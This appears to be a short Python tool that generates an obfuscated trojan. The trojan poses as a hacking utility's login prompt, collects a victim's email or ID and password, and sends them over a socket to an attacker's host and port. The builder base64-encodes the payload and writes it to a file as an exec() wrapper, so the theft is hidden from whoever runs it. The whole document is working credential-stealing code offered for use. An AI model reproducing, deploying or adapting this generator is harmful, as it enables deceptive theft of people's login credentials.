###
# Author : Muhammad Quwais Saputra
###

import base64

def sbd_injects(f_name,LHOST,LPORT):
    scripts = """
import socket 
import getpass

def SLogin():
    LHOST="{0}"
    LPORT={1}
    s = socket.socket()
    s.connect((LHOST,int(LPORT)))
    print("[!] You Must Login First!!")
    x = input("[?] Your email/id : ")
    f = getpass.getpass(prompt="[?] Your Password : ")
    b_s = bytes(x,encoding="utf-8")
    b_x = bytes(f,encoding="utf-8")
    s.send(b_s)
    s.send(b_x)
    print("[!] Login Success")

SLogin()
target = input("Target id : ")
w = input("wordlist : ")
    """.format(LHOST,LPORT)
    scripts_e = bytes(scripts, encoding="utf-8")
    devil = base64.b64encode(scripts_e)

    script_to_run = """
import base64
exec(base64.b64decode({0}))
    """.format(devil)
    with open(f_name, "w") as f:
        f.write(script_to_run)
        f.close()

def Injects(script, f_name, LHOST, LPORT):
    if script == "sbd":
        sbd_injects(f_name, LHOST, LPORT)
    else:
        pass
